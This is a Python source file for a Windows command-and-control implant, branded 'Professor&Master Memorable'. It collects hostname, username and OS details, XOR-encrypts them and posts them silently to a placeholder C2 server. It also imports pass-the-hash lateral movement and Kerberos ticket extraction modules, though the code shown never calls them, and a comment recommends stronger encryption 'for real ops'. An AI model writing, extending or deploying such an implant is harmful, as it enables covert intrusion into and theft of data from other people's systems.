"""
Windows Agent - Professor&Master Memorable
Passive recon, device info, encrypted C2 beacon, and modular plugin-ready (upgrade)
"""
import platform, socket, json, time, requests, os, getpass
from base64 import b64encode
from hashlib import sha256
from cp_opereatorex.comms.comlink_ai import ComLinkAI
from core.opsec.anomaly_watchdog import AnomalyWatchdog
from core.ai.ai_task_suggest import suggest_tasks
from core.lateral.pass_the_hash import automate_lateral_movement
from core.lateral.kerberos_probe import extract_kerberos_tickets
from core.recon.recon_ai import passive_recon

C2_URL = os.getenv("C2_URL", "http://your-c2-server.com/beacon")
AGENT_ID = "win-" + str(int(time.time()))
SECRET_KEY = os.getenv("AGENT_KEY", "supersecretkey")

com = ComLinkAI()
watchdog = AnomalyWatchdog()

def get_device_info():
    return {
        "agent_id": AGENT_ID,
        "platform": "Windows",
        "release": platform.release(),
        "machine": platform.machine(),
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "timestamp": int(time.time())
    }

def encrypt_payload(data):
    # Simple XOR+base64 for demo (replace with AES for real ops)
    key = sha256(SECRET_KEY.encode()).digest()
    raw = json.dumps(data).encode()
    enc = bytes([b ^ key[i % len(key)] for i, b in enumerate(raw)])
    return b64encode(enc).decode()

def beacon():
    info = get_device_info()
    payload = encrypt_payload(info)
    try:
        requests.post(C2_URL, data=payload, timeout=5)
    except Exception:
        pass

if __name__ == "__main__":
    beacon()